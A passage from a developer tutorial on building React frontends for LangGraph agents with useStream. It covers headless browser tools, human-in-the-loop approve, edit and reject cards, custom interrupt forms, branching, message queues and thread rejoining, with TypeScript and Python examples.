from langchain_core.messages import AIMessage

message = AIMessage("", tool_calls=[{"id": "c1", "name": "get_weather", "args": {"location": "Sydney"}}])
tool_calls = [obj(call_id="c1", name="get_weather"), obj(call_id="c9", name="web_search")]   # like stream.toolCalls

my_ids = {t["id"] for t in (message.tool_calls or [])}
mine = [tc for tc in tool_calls if tc.call_id in my_ids]
print([tc.name for tc in mine])                     # ['get_weather']
```

The same call changes status **in place**, from `running` to `finished` or `error`. That's why cards are keyed by `callId`: React then updates the same card instead of creating a new one.

### 7.2 Headless tools

These are tools that run **in the browser**: geolocation, clipboard, IndexedDB, file pickers. Here's how they work:

1. The backend registers a tool that immediately calls `interrupt()` instead of running anything.
2. The frontend declares a tool with the **exact same name and argument names**.
3. The frontend adds the browser code with `.implement(...)`.
4. Pass it to `useStream({ tools: [...] })`. The hook catches the interrupt, runs your function, and resumes the graph with the result. The user never sees the interrupt.

Frontend:

```tsx
import { useStream } from "@langchain/react";
import { tool } from "langchain";
import { z } from "zod";
import type { AgentState } from "./types";   // Appendix A
import { AGENT_URL } from "./shared";         // Appendix A

export const geolocationGet = tool({
  name: "geolocation_get",                                    // must equal the Python tool name
  description: "Get the user's current GPS location",
  schema: z.object({ highAccuracy: z.boolean().optional() }), // must equal the Python argument names
});

export const geolocationImpl = geolocationGet.implement(async ({ highAccuracy }) =>
  new Promise((resolve, reject) =>
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
      (err) => reject(new Error(err.message)),
      { enableHighAccuracy: highAccuracy ?? false },
    ),
  ),
);

export function HeadlessChat() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "headless_tools", tools: [geolocationImpl] });
  return <p>{stream.messages.length} messages</p>;
}
```

**What each piece does:**

- `geolocationGet`: the tool's description: its name and arguments. It must match the Python side.
- `geolocationImpl`: the browser code that actually gets the user's location when the agent asks for it.
- `HeadlessChat`: a chat that registers the tool, so the agent's requests for it are answered automatically.

Backend (Python), with the matching name and argument:

```python
from typing import Annotated
from langchain_core.tools import tool, InjectedToolCallId
from langgraph.types import interrupt

@tool
def geolocation_get(tool_call_id: Annotated[str, InjectedToolCallId], highAccuracy: bool = False):
    """Get the user's current GPS location"""
    # The payload shape the frontend SDK recognizes as a headless tool call
    return interrupt({
        "type": "tool",
        "tool_call": {"id": tool_call_id, "name": "geolocation_get", "args": {"highAccuracy": highAccuracy}},
    })
```

These were checked against the real packages:

- The frontend SDK treats an interrupt as a headless tool only if its value is `{ type: "tool", toolCall | tool_call: { id, name, args } }` (from `parseHeadlessToolInterruptPayload` in `@langchain/langgraph-sdk`).
- `tool_call_id` is filled in by LangChain and hidden from the model, so the model only sees `highAccuracy`.

I haven't run this end to end against a live server, so check the resumed value on the Python side once.

**If a name or argument name differs, it fails silently**: the frontend never recognizes the interrupt, and the run waits forever. The fix is to make `name` and the argument names identical on both sides. Note it's `highAccuracy` in both files, not `high_accuracy` in Python.

### 7.3 Human-in-the-loop (HITL)

The agent pauses **before** a sensitive action and waits for a person to decide:

```text
agent hits interrupt → stream.interrupt is set → UI shows a review card
→ user decides → stream.respond(decision) → agent continues → stream.interrupt clears
```

#### 7.3.1 Two ways the backend can pause

The second type in `useStream<AgentState, ___>` describes what the agent sends when it pauses (`stream.interrupt.value`). It depends on how the backend pauses:

| | Your own `interrupt()` (4.6) | `HumanInTheLoopMiddleware` (this section) |
| --- | --- | --- |
| How the backend pauses | Your code calls `interrupt(...)` with a payload you designed | LangChain's middleware pauses before the tool runs |
| What it sends | Whatever you chose, e.g. `{ question: "Send email to bob?" }` | A fixed shape: `{ actionRequests, reviewConfigs }` |
| Type to use | `ApprovalInterrupt` (your own, Appendix A) | `HITLRequest` (from `"langchain"`) |
| What you send back | Whatever your code expects, e.g. `{ approved: true }` | `{ decisions: [{ type: "approve" }] }` |

```python
# 4.6: you design the pause yourself
from langgraph.types import interrupt

def send_email(to: str, body: str):
    answer = interrupt({"question": f"Send email to {to}?"})   # → ApprovalInterrupt
    if answer["approved"]:
        ...
```

```python
# 7.3: the middleware pauses before the tool runs
from langchain.agents import create_agent
from langchain.agents.middleware import HumanInTheLoopMiddleware

agent = create_agent(
    model="anthropic:claude-haiku-4-5",
    tools=[email_tool],
    middleware=[HumanInTheLoopMiddleware(interrupt_on={"send_email": True})],   # → HITLRequest
)
```

The type only helps TypeScript (autocomplete and error checking). At runtime both behave the same. The different `assistantId`s in the examples (`"agent"`, `"human_in_the_loop"`) are just different graphs' keys in `langgraph.json`.

#### 7.3.2 The example tool

The examples below use this `send_email` tool:

```ts
import { tool } from "langchain";
import { z } from "zod";

export const emailTool = tool(
  async ({ to, subject, body }) => {
    const id = `msg_${Date.now().toString(36)}`;
    return JSON.stringify({
      status: "sent",
      messageId: id,
      to,
      subject,
      body,
      summary: `Email "${subject}" sent to ${to} with body: "${body}"`,
    });
  },
  {
    name: "send_email",
    description: "Send an email to a recipient with a subject and body",
    schema: z.object({
      to: z.string().describe("Recipient email address"),
      subject: z.string().describe("Email subject line"),
      body: z.string().describe("Email body content"),
    }),
  },
);
```

The first argument is the function that runs when the tool is called (after you approve). It's `async` because real tools usually wait on something slow, like an email server. Whatever it `return`s becomes the tool result the model reads next; here that's a JSON string saying the email was sent.

**Python equivalent** (for a Python backend). The zod `schema` becomes a Pydantic model passed as `args_schema`:

```python
import json, time
from pydantic import BaseModel, Field
from langchain_core.tools import tool

class SendEmailInput(BaseModel):                         # ← the zod schema
    to: str = Field(description="Recipient email address")
    subject: str = Field(description="Email subject line")
    body: str = Field(description="Email body content")

@tool("send_email", args_schema=SendEmailInput)          # ← name + schema
async def email_tool(to: str, subject: str, body: str) -> str:
    """Send an email to a recipient with a subject and body"""   # ← description
    msg_id = f"msg_{int(time.time() * 1000):x}"
    return json.dumps({
        "status": "sent", "messageId": msg_id, "to": to, "subject": subject, "body": body,
        "summary": f'Email "{subject}" sent to {to} with body: "{body}"',
    })
```

| TypeScript | Python |
| --- | --- |
| `tool(fn, { ... })` | `@tool` decorator on the function |
| `name: "send_email"` | `@tool("send_email", ...)` |
| `description: "..."` | the function's docstring |
| `schema: z.object({...})` | `args_schema=SendEmailInput` (a Pydantic `BaseModel`) |
| `z.string().describe("...")` | `str = Field(description="...")` |
| `async ({ to, subject, body }) => {...}` | `async def email_tool(to, subject, body)` |

#### 7.3.3 What the agent sends: `HITLRequest`

With `HumanInTheLoopMiddleware`, `stream.interrupt.value` is a `HITLRequest` (type from `"langchain"`). It holds two lists, with one item per action the agent wants to take:

```ts
interface HITLRequest {
  actionRequests: { name: string; args: Record<string, any>; description?: string }[];           // what the agent wants to do
  reviewConfigs:  { actionName: string; allowedDecisions: ("approve" | "edit" | "reject")[] }[]; // which buttons to show
}
```

`reviewConfigs[i]` belongs to `actionRequests[i]`.

When the agent pauses before sending, `action` (one item of `actionRequests`) holds the call it wants to make:

```ts
{ name: "send_email", args: { to: "bob@example.com", subject: "Hi", body: "Meeting moved to 3pm." } }
```

That's where `subject` in the `edit` decision below comes from. `{ ...action.args, subject: "New" }` copies all the arguments and replaces only `subject`, which gives `{ to: "bob@example.com", subject: "New", body: "Meeting moved to 3pm." }`.

#### 7.3.4 What you send back: `HITLResponse`

You answer with a `HITLResponse`: a list with **one decision per action, in the same order** as `actionRequests`:

```ts
interface HITLResponse {
  decisions: Decision[];
}

type Decision =
  | { type: "approve" }                                                          // run the tool as-is
  | { type: "edit"; editedAction: { name: string; args: Record<string, any> } }  // run it with changed args
  | { type: "reject"; message?: string };                                        // don't run it; message tells the model why
```

The `|` means "one of these shapes". Sending each one:

```ts
const action = request.actionRequests[0];   // request = stream.interrupt.value

stream.respond({ decisions: [{ type: "approve" }] });
stream.respond({ decisions: [{ type: "reject", message: "Too aggressive, don't send." }] });
stream.respond({ decisions: [{ type: "edit", editedAction: { name: action.name, args: { ...action.args, subject: "New" } } }] });
```

**`respond` (Python backend only).** The Python middleware also accepts `{ type: "respond", message }`. Your text becomes the tool's result and the tool doesn't run, which is useful for tools that ask the user a question. TypeScript's `HITLResponse` type doesn't list it, but passing it straight to `stream.respond` compiles:

```ts
stream.respond({ decisions: [{ type: "respond", message: "Blue." }] });
```

Never use `respond` to deny an action: the model receives it as a successful tool result. Use `reject`.

#### 7.3.5 A review card

A card that shows the action and only the buttons allowed in `allowedDecisions`:

```tsx
import { useState } from "react";
import { useStream } from "@langchain/react";
import type { HITLRequest, HITLResponse } from "langchain";
import type { AgentState } from "./types";            // Appendix A
import { AGENT_URL, MarkdownBubble } from "./shared"; // Appendix A

function ApprovalCard({ request, onRespond }: { request: HITLRequest; onRespond: (r: HITLResponse) => void }) {
  const action = request.actionRequests[0];
  const allowed = request.reviewConfigs[0]?.allowedDecisions ?? [];
  const [reason, setReason] = useState("");
  return (
    <div className="rounded-lg border border-amber-300 p-4">
      <p><strong>{action.name}</strong> {action.description}</p>
      <pre className="text-xs">{JSON.stringify(action.args, null, 2)}</pre>
      {allowed.includes("approve") && (
        <button onClick={() => onRespond({ decisions: [{ type: "approve" }] })}>Approve</button>
      )}
      {allowed.includes("reject") && (
        <>
          <input value={reason} onChange={(e) => setReason(e.target.value)} placeholder="Why reject?" />
          <button onClick={() => onRespond({ decisions: [{ type: "reject", message: reason }] })}>Reject</button>
        </>
      )}
    </div>
  );
}

export function HitlChat() {
  const stream = useStream<AgentState, HITLRequest>({ apiUrl: AGENT_URL, assistantId: "human_in_the_loop" });
  const interrupt = stream.interrupt;
  return (
    <div>
      {stream.messages.map((msg) => <MarkdownBubble key={msg.id} text={msg.text} />)}
      {interrupt?.value && (
        <ApprovalCard request={interrupt.value} onRespond={(response) => void stream.respond(response)} />
      )}
    </div>
  );
}
```

**What each piece does:**

- `ApprovalCard`: a yellow card that shows the action the agent wants to take, with Approve and Reject buttons (and a box for the reason).
- `HitlChat`: the chat screen. It shows the approval card whenever the agent pauses.

The interrupt is saved on the server, so after a page refresh `stream.interrupt` is set again. Render the card from `stream.interrupt`, not from your own `useState` copy.

#### 7.3.6 Editing an action

An `edit` decision means "run the tool, but with arguments I changed". For example, you fix the subject of an email before it's sent. You need three things.

**1. The backend must allow `edit`.** Set `allowed_decisions` for the tool:

```python
from langchain.agents.middleware import HumanInTheLoopMiddleware

HumanInTheLoopMiddleware(interrupt_on={
    "send_email": {"allowed_decisions": ["approve", "edit", "reject"]},
})   # pass this in create_agent(..., middleware=[...]) as in 7.3.1
```

**2. A form to change the arguments, and an Edit button on the card.** This version of `ApprovalCard` replaces the one in 7.3.5:

```tsx
import { useState } from "react";
import type { HITLRequest, HITLResponse } from "langchain";

type ActionRequest = HITLRequest["actionRequests"][number];   // one action the agent wants to take

function EditForm({ action, onRespond, onCancel }: {
  action: ActionRequest;
  onRespond: (r: HITLResponse) => void;
  onCancel: () => void;
}) {
  const [args, setArgs] = useState<Record<string, any>>(action.args);   // start from the agent's values

  return (
    <div className="space-y-2">
      {Object.entries(args).map(([field, value]) => (                   // one input per argument
        <label key={field} className="block">
          {field}
          <input
            value={String(value)}
            onChange={(e) => setArgs({ ...args, [field]: e.target.value })}   // copy args, replace this field
          />
        </label>
      ))}
      <button onClick={() => onRespond({ decisions: [{ type: "edit", editedAction: { name: action.name, args } }] })}>
        Save and run
      </button>
      <button onClick={onCancel}>Cancel</button>
    </div>
  );
}

export function ApprovalCard({ request, onRespond }: { request: HITLRequest; onRespond: (r: HITLResponse) => void }) {
  const action = request.actionRequests[0];
  const allowed = request.reviewConfigs[0]?.allowedDecisions ?? [];
  const [editing, setEditing] = useState(false);                     // is the edit form open?

  if (editing) {
    return <EditForm action={action} onRespond={onRespond} onCancel={() => setEditing(false)} />;
  }
  return (
    <div className="rounded-lg border border-amber-300 p-4">
      <p><strong>{action.name}</strong> {action.description}</p>
      <pre className="text-xs">{JSON.stringify(action.args, null, 2)}</pre>
      {allowed.includes("approve") && (
        <button onClick={() => onRespond({ decisions: [{ type: "approve" }] })}>Approve</button>
      )}
      {allowed.includes("edit") && <button onClick={() => setEditing(true)}>Edit</button>}
      {allowed.includes("reject") && (
        <button onClick={() => onRespond({ decisions: [{ type: "reject", message: "Rejected by user." }] })}>Reject</button>
      )}
    </div>
  );
}
```

**What each piece does:**

- `ActionRequest`: the type of one action the agent wants to take (`[number]` is explained in 7.3.7).
- `EditForm`: one text box per argument, filled in with the agent's values, plus "Save and run" and "Cancel".
- `ApprovalCard`: the card from 7.3.5, plus an Edit button (only if `edit` is allowed) that swaps the card for the form.

**How `onRespond` reaches `EditForm`.** `onRespond` is **the same function** the whole way down. It's created once, in `HitlChat`, and each component just passes it to the next, unchanged.

```text
HitlChat
  creates: onRespond={(response) => void stream.respond(response)}
      |
      v
  ApprovalCard  <-- receives it: function ApprovalCard({ request, onRespond })
      |
      |-- Approve / Reject --> call onRespond(...) right away (nothing to fill in)
      |-- Edit             --> only setEditing(true); sends nothing yet
      |
      v (if editing)
  EditForm  <-- receives the SAME function: <EditForm onRespond={onRespond} ... />
      |
      |-- user types new values (local state, not sent yet)
      |-- "Save and run" --> NOW calls onRespond(...) with the edited args
```

- **In `onRespond={onRespond}`**, the left side is `EditForm`'s prop name, and the right side is `ApprovalCard`'s variable holding the function from `HitlChat`. Nothing new is created: it's forwarded one level deeper.
- **`onRespond: (r: HITLResponse) => void`** at the top of `EditForm` only declares that it expects to be given such a function, like a parameter in Python.
- **Why pass it through:** only `HitlChat` knows about `stream.respond`. The components below just get "a function to call when I'm done". Data goes down as props, and events come back up through callback props: the same pattern as `onSubmit` (2.5) and `onDecide` (7.3.7).

Python version:

```python
def hitl_chat():
    def on_respond(response):
        stream.respond(response)                  # the only place that knows about stream
    approval_card(interrupt_value, on_respond=on_respond)

def approval_card(request, on_respond):
    # Approve: on_respond({"decisions": [{"type": "approve"}]})
    # Edit:    just show the form, call nothing
    edit_form(action, on_respond=on_respond)      # pass the SAME function down

def edit_form(action, on_respond):
    args = dict(action["args"])                   # local copy the user edits
    # "Save and run":
    on_respond({"decisions": [{"type": "edit", "edited_action": {"name": action["name"], "args": args}}]})
```

**3. What happens, step by step**, with the `send_email` tool:

1. The agent pauses with `{ to: "bob@example.com", subject: "Hi", body: "3pm" }`.
2. You click **Edit**. `editing` becomes `true`, and the form shows three boxes filled with those values.
3. You change `subject` to `"Meeting update"`. `setArgs({ ...args, subject: "Meeting update" })` copies the arguments and replaces only that field.
4. You click **Save and run**, which sends:

   ```ts
   stream.respond({ decisions: [{ type: "edit", editedAction: { name: "send_email", args: { to: "bob@example.com", subject: "Meeting update", body: "3pm" } } }] })
   ```

5. The backend runs `send_email` with your arguments instead of the agent's.

I ran this pause-and-edit cycle against the real Python middleware, with a fake model standing in for Claude. The tool ran with `subject: "Meeting update"`.

**Python and TypeScript spell the keys differently.** The Python middleware uses `edited_action`, `action_requests` and `review_configs`, while the TypeScript types use `editedAction`, `actionRequests` and `reviewConfigs`. `useStream` converts between the two automatically in both directions, so the code above works with this repo's Python backend. Only if you resume from Python yourself (the SDK in 4.8) do you write `edited_action`.

**Limit of this form:** every box is a text box, so all values are sent as text. For number or nested arguments, use a `<textarea>` with `JSON.stringify(args, null, 2)` and `JSON.parse` it on save.

#### 7.3.7 Several actions in one pause

One pause can contain several actions. Collect a decision for each one, then call `respond` once:

```tsx
import { useState } from "react";
import type { HITLRequest, HITLResponse } from "langchain";

type Decision = HITLResponse["decisions"][number];   // one decision object

function SingleActionCard({ action, onDecide }: {
  action: HITLRequest["actionRequests"][number];
  onDecide: (d: Decision) => void;
}) {
  return (
    <div className="rounded border p-3">
      <strong>{action.name}</strong>
      <button onClick={() => onDecide({ type: "approve" })}>Approve</button>
      <button onClick={() => onDecide({ type: "reject", message: "Not approved by user." })}>Reject</button>
    </div>
  );
}

export function MultiActionReview({ request, onRespond }: { request: HITLRequest; onRespond: (r: HITLResponse) => void }) {
  const [decisions, setDecisions] = useState<Record<number, Decision>>({});
  const allDecided = Object.keys(decisions).length === request.actionRequests.length;
  return (
    <div>
      {request.actionRequests.map((action, i) => (
        <SingleActionCard key={i} action={action} onDecide={(d) => setDecisions((prev) => ({ ...prev, [i]: d }))} />
      ))}
      <button disabled={!allDecided}
        onClick={() => onRespond({ decisions: request.actionRequests.map((_, i) => decisions[i]) })}>
        Submit all decisions
      </button>
    </div>
  );
}
```

**What each piece does:**

- `Decision`: one answer: approve, edit or reject.
- `SingleActionCard`: one action with its own Approve / Reject buttons.
- `MultiActionReview`: a card per action, plus a "Submit all decisions" button that's enabled once every action is decided.

Use it in place of `ApprovalCard`: `<MultiActionReview request={interrupt.value} onRespond={(r) => void stream.respond(r)} />`.

**Reading this code:**

- **`HITLResponse["decisions"][number]`.** `HITLResponse["decisions"]` is the type of the `decisions` field: `Decision[]`, an array. `[number]` means "give me the type of one item inside this array type", the same as asking what `arr[i]` would be for any index. It works at the type level; it doesn't get an element out of a real array. `HITLRequest["actionRequests"][number]` works the same way and gives the type of one action.
- **`Decision` is a union.** It's several allowed object shapes, told apart by their `type` field: `{ type: "approve" }`, `{ type: "edit", editedAction }` or `{ type: "reject", message? }`.
- **`onDecide` isn't built in.** It's a prop name that `SingleActionCard` defines for itself, like `onSubmit` in `ChatInput` (2.5). Props that take a function usually start with `on`.
- **`onDecide: (d: Decision) => void`.** `onDecide` runs and returns nothing usable. Its whole job is the side effect: updating state in the parent. `void` here means "returns nothing" (Python: `Callable[[Decision], None]`). This is a different `void` from `onClick={() => void stream.stop()}`, where it means "run it and ignore the result".

**What happens when you click, step by step.** Say the agent wants to take two actions:

```ts
const actionRequests = [
  { name: "delete_file", args: { path: "/workspace/temp.txt" } },
  { name: "send_email", args: { to: "a@b.com", subject: "Hi", body: "..." } },
];
```

**1. The first `.map()` draws one card per action.** `.map((action, i) => ...)` goes through the list and gives you each item and its position `i`:

```ts
actionRequests.map((action, i) => {
  console.log(i, action.name);
});
// 0 delete_file
// 1 send_email
```

In the component, each card gets its action and an `onDecide` function that remembers its `i`.

**2. Clicking a button stores a `Decision` object in the parent's state.** Clicking Approve on card 0 calls `onDecide({ type: "approve" })`, which runs `setDecisions((prev) => ({ ...prev, [0]: { type: "approve" } }))`. After both cards are decided, the state is an object keyed by index:

```ts
decisions = { 0: { type: "approve" }, 1: { type: "reject", message: "Not approved by user." } }
```

**3. The second `.map()` turns it into the array LangGraph expects.** `setDecisions` alone isn't enough. The state is key-value pairs by index, but LangGraph wants an ordered array: `{ decisions: [decisionForAction0, decisionForAction1, ...] }`. The `.map()` in the Submit button does that conversion:

```ts
request.actionRequests.map((_, i) => decisions[i])
// i = 0 → decisions[0] → the Decision stored for action 0
// i = 1 → decisions[1] → the Decision stored for action 1
// result: [decisions[0], decisions[1]], an array in the right order
```

It doesn't decide anything again. It only reshapes the data from `{ 0: x, 1: y }` into `[x, y]`. (`_` is a name for the argument that isn't used; only `i` is needed.)

Python equivalent of the whole thing:

```python
decisions: dict[int, Decision] = {}   # filled in by each card's on_decide

# later, on submit:
ordered_decisions = [decisions[i] for i, _ in enumerate(request["action_requests"])]
on_respond(HITLResponse(decisions=ordered_decisions))
```

#### 7.3.8 Custom forms

The backend can call `interrupt({...})` with its own payload, and the frontend picks a form by a field such as `formType`:

```tsx
import { useState } from "react";
import { useStream } from "@langchain/react";
import type { AgentState } from "./types";   // Appendix A
import { AGENT_URL } from "./shared";         // Appendix A

interface RefundCard {                        // must match what the backend passes to interrupt()
  formType: "refund-approval";
  title: string;
  context: { orderId: string; amount: number };
}
interface RefundDecision {                    // what the backend expects back
  approved: boolean;
  amount?: number;
}

function RefundForm({ card, onResolve }: { card: RefundCard; onResolve: (d: RefundDecision) => void }) {
  const [amount, setAmount] = useState(card.context.amount);
  return (
    <div className="rounded-lg border p-4">
      <h3>{card.title} (order {card.context.orderId})</h3>
      <input type="number" value={amount} onChange={(e) => setAmount(Number(e.target.value))} />
      <button onClick={() => onResolve({ approved: true, amount })}>Approve refund</button>
      <button onClick={() => onResolve({ approved: false })}>Decline</button>
    </div>
  );
}

export function RefundChat() {
  const stream = useStream<AgentState, RefundCard>({ apiUrl: AGENT_URL, assistantId: "hitl_interrupt_forms" });
  const card = stream.interrupt?.value;
  if (card?.formType === "refund-approval") {
    return <RefundForm card={card} onResolve={(d) => void stream.respond(d)} />;
  }
  return null;
}
```

**What each piece does:**

- `RefundCard`: what the agent sends when it pauses: the order and the refund amount.
- `RefundDecision`: what you send back: approved or not, and the final amount.
- `RefundForm`: a form with the refund amount and Approve / Decline buttons.
- `RefundChat`: shows the refund form when the agent pauses for a refund approval.

**Reading this code:**

- **`useStream<AgentState, RefundCard>`.** The first generic is the graph state, and the second is the interrupt payload shape: the same pattern as `useStream<AgentState, HITLRequest>` in 7.3.5, where the payload comes from the HITL middleware. Here the payload is `RefundCard`, a shape you designed yourself.
- **What `formType` is for.** `if (card?.formType === "refund-approval")` checks whether the payload that came back matches this specific shape. If your app has several kinds of pause (refund approval, delete confirmation, edit request), each backend `interrupt()` call tags its payload with a different `formType` string. The frontend uses that string to decide which component to render.

The backend side, tagging its payload:

```python
from langgraph.types import interrupt

def refund_order(order_id: str, amount: float):
    decision = interrupt({
        "formType": "refund-approval",                   # the tag the frontend checks
        "title": "Approve refund",
        "context": {"orderId": order_id, "amount": amount},
    })
    if decision["approved"]:                             # what RefundForm sent back
        ...                                              # issue the refund for decision.get("amount", amount)
```

#### 7.3.9 Pauses from subagents or subgraphs

Pauses from subagents or subgraphs aren't on `stream.interrupt`. Read them from `getThread()` and pass `namespace`. This reuses `ApprovalCard` from above:

```tsx
export function NestedInterrupts() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "deep_agent" });
  const pending = stream.getThread()?.interrupts ?? [];
  return (
    <div>
      {pending.map((entry) => (
        <ApprovalCard
          key={entry.interruptId}
          request={entry.payload as HITLRequest}
          onRespond={(r) => void stream.respond(r, { interruptId: entry.interruptId, namespace: entry.namespace })}
        />
      ))}
    </div>
  );
}
```

**What each piece does:**

- `NestedInterrupts`: shows an approval card for each pause that came from a subagent or subgraph (not the main agent).

---

## 8. Patterns: managing conversations

Source: [04-conversations-streaming.md](langgraph-react-frontend/references/04-conversations-streaming.md). All of these need checkpoints on the backend.

### 8.1 Branching (edit and regenerate)

Every message records the checkpoint from **just before** it was created (`parentCheckpointId`, read with `useMessageMetadata`). Editing or regenerating starts a new run from that checkpoint with `forkFrom`:

```tsx
import { useState } from "react";
import { useMessageMetadata, useStream, type AnyStream } from "@langchain/react";
import { AIMessage, HumanMessage, type BaseMessage } from "langchain";
import type { AgentState } from "./types";                                         // Appendix A
import { AGENT_URL, AssistantBubble, Composer, UserBubble } from "./shared";       // Appendix A

function MessageWithForkControls({ stream, message }: { stream: AnyStream; message: BaseMessage }) {
  const metadata = useMessageMetadata(stream, message.id);
  const forkFrom = metadata?.parentCheckpointId;          // checkpoint just before this message
  const [editing, setEditing] = useState(false);
  const [draft, setDraft] = useState(message.text);
  const disabled = !forkFrom || stream.isLoading;        // no editing while the agent is replying

  if (HumanMessage.isInstance(message)) {
    if (editing) {
      return (
        <form
          onSubmit={(e) => {
            e.preventDefault();
            if (!forkFrom) return;
            void stream.submit({ messages: [new HumanMessage(draft)] }, { forkFrom });   // edit
            setEditing(false);
          }}
        >
          <textarea value={draft} onChange={(e) => setDraft(e.target.value)} />
          <button disabled={disabled || draft === message.text}>Save</button>
          <button type="button" onClick={() => { setDraft(message.text); setEditing(false); }}>Cancel</button>
        </form>
      );
    }
    return (
      <div>
        <UserBubble text={message.text} />
        <button disabled={disabled} onClick={() => setEditing(true)}>Edit</button>
      </div>
    );
  }

  return (
    <div>
      <AssistantBubble text={message.text} />
      {AIMessage.isInstance(message) && (
        <button disabled={disabled} onClick={() => forkFrom && void stream.submit(undefined, { forkFrom })}>
          Regenerate
        </button>
      )}
    </div>
  );
}

export function BranchingChat() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "simple_agent" });
  return (
    <div>
      {stream.messages.map((m) => <MessageWithForkControls key={m.id} stream={stream} message={m} />)}
      <Composer disabled={stream.isLoading} onSend={(text) => stream.submit({ messages: [new HumanMessage(text)] })} />
    </div>
  );
}
```

**What each piece does:**

- `MessageWithForkControls`: one message with an Edit button (user messages) or a Regenerate button (AI messages).
- `BranchingChat`: the chat screen, using that component for every message.

The conversation becomes a tree. The old answer stays in the checkpoint history:

```text
User: "What is React?"
  ├─ AI: "React is a JavaScript library..."   (branch A)
  └─ AI: "React is a UI framework..."         (branch B, regenerated)
```

- v1 has no built-in "answer 2 of 3" switcher. The data for one comes from `stream.client.threads.getHistory(threadId)`, loaded the same way as in 8.4.
- The skill's docs disagree on whether `forkFrom` is a string or `{ checkpointId }`. In the installed version (1.1.2) it's a **string**. You can check any version with:

```bash
grep -rn "forkFrom" node_modules/@langchain/langgraph-sdk/dist --include='*.d.ts'
# → forkFrom?: string;
```

### 8.2 Message queue

By default, submitting while a run is active **cancels** it (`multitaskStrategy: "rollback"`). To let users keep sending messages, queue them with `"enqueue"`:

```tsx
import { useStream, useSubmissionQueue, type SubmissionQueueEntry } from "@langchain/react";
import { HumanMessage } from "langchain";
import type { AgentState } from "./types";                        // Appendix A
import { AGENT_URL, Composer, MarkdownBubble } from "./shared";   // Appendix A

function previewInput(entry: SubmissionQueueEntry<AgentState>): string {
  return entry.values?.messages?.[0]?.text ?? "(no text)";   // values = what was passed to submit()
}

export function QueueChat() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "simple_agent" });
  const { entries, size, cancel, clear } = useSubmissionQueue(stream);
  const send = (text: string) =>
    stream.submit({ messages: [new HumanMessage(text)] }, { multitaskStrategy: "enqueue" });

  return (
    <div>
      {stream.messages.map((m) => <MarkdownBubble key={m.id} text={m.text} />)}
      {size > 0 && (
        <div>
          <p>{size} queued</p>
          <ol>
            {entries.map((e) => (
              <li key={e.id}>
                {previewInput(e)} <button onClick={() => void cancel(e.id)}>Cancel</button>
              </li>
            ))}
          </ol>
          <button onClick={() => void clear()}>Clear queue</button>
        </div>
      )}
      <Composer onSend={send} />   {/* no disabled prop: stays usable while the agent works */}
    </div>
  );
}
```

**What each piece does:**

- `previewInput`: gets the text of a queued message, to show it in the list.
- `QueueChat`: a chat where you can keep sending while the agent works. Extra messages appear in an "N queued" list with Cancel buttons.


| Strategy     | Behaviour                                                          |
| ------------ | ------------------------------------------------------------------ |
| `"rollback"` | Default. Cancel the active run, start the new one.                 |
| `"reject"`   | Ignore the new submit (its promise rejects).                       |
| `"enqueue"`  | Add it to a client-side queue; run in order after the current run. |


- A queue entry has `id`, `values` (the submitted input), `options` and `createdAt`. The skill's reference calls these `input` and `enqueuedAt`, but those names don't exist in version 1.1.2.
- `cancel(id)` removes one queued entry. `clear()` empties the queue but doesn't stop the current run. To stop everything, call both: `await clear(); await stream.stop();`.
- Changing `threadId` clears the queue.

### 8.3 Join and rejoin

#### 8.3.1 The idea in one sentence

`ChatShell` remembers *which* conversation you're in (saved in `localStorage`, so it survives even a page refresh), and swaps between showing the live chat or just a "Rejoin" button. `RejoinableChat` is the live chat itself, and gets torn down and rebuilt each time you leave/rejoin, but always told the same `threadId` so it reconnects to the same conversation.

Nothing here loops. It's event-driven: user clicks something → a bit of state changes → React re-renders → screen updates. That's the whole engine.

#### 8.3.2 Full code, with the flow annotated inline

```tsx
import { useCallback, useState } from "react";
import { useStream } from "@langchain/react";
import { HumanMessage } from "langchain";
import type { AgentState } from "./types";                  // Appendix A
import { AGENT_URL, Composer, MarkdownBubble } from "./shared";   // Appendix A

const THREAD_KEY = "agent-thread-id";   // just a label, used as the localStorage key

export function ChatShell() {
  // STEP 1 — first visit
  // localStorage.getItem returns null if nothing was saved before.
  // The () => wrapper means this ONLY runs once, on first mount — not on every re-render.
  const [threadId, setThreadId] = useState<string | null>(() => localStorage.getItem(THREAD_KEY));

  const [connected, setConnected] = useState(true);   // is the chat currently showing?

  // persist = a function that updates BOTH React state AND localStorage together, in one call.
  // Used both to SAVE a real id, and to CLEAR it (id = null).
  const persist = useCallback((id: string | null) => {
    setThreadId(id);
    if (id) localStorage.setItem(THREAD_KEY, id);   // save it
    else localStorage.removeItem(THREAD_KEY);        // or clear it, if starting fresh
  }, []);

  // STEP 6 — "New conversation": wipe the saved thread, next message starts a new one
  const newConversation = () => persist(null);

  // STEP 3's result — connected is false, show only this
  if (!connected) {
    return (
      <button onClick={() => setConnected(true)}>   {/* STEP 4 — show the chat again */}
        Rejoin
      </button>
    );
  }

  // Normal view: connected is true
  return (
    <div>
      <button onClick={newConversation}>New conversation</button>

      {/* threadId is passed down UNCHANGED — it's still whatever was set back in STEP 2.
          ChatShell itself never unmounts, so this state just sits here, untouched,
          the whole time the chat is "left" and "rejoined". */}
      <RejoinableChat
        threadId={threadId}                     // the SAME saved id, every time
        onThreadId={persist}                    // handing the child a function it can call later
        onLeave={() => setConnected(false)}     // handing the child a function it can call on "Leave"
      />
    </div>
  );
}

function RejoinableChat({ threadId, onThreadId, onLeave }: {
  threadId: string | null;
  onThreadId: (id: string) => void;   // just the TYPE — "must be a function taking one string"
  onLeave: () => void;
}) {
  // STEP 2 — threadId is null on first visit, so useStream starts a NEW thread.
  // Internally, useStream watches for the server assigning a real id, and WHEN that
  // happens, it calls onThreadId(newId) itself — you never call onThreadId directly.
  // Since onThreadId === persist (passed in from ChatShell), this saves the id.
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "agent", threadId, onThreadId });

  return (
    <div>
      {stream.messages.map((m) => <MarkdownBubble key={m.id} text={m.text} />)}

      {/* STEP 2 — Composer draws the text box AND the Send button (Appendix A).
          onSend = what happens on Send. The first message creates the thread. */}
      <Composer disabled={stream.isLoading} onSend={(text) => stream.submit({ messages: [new HumanMessage(text)] })} />

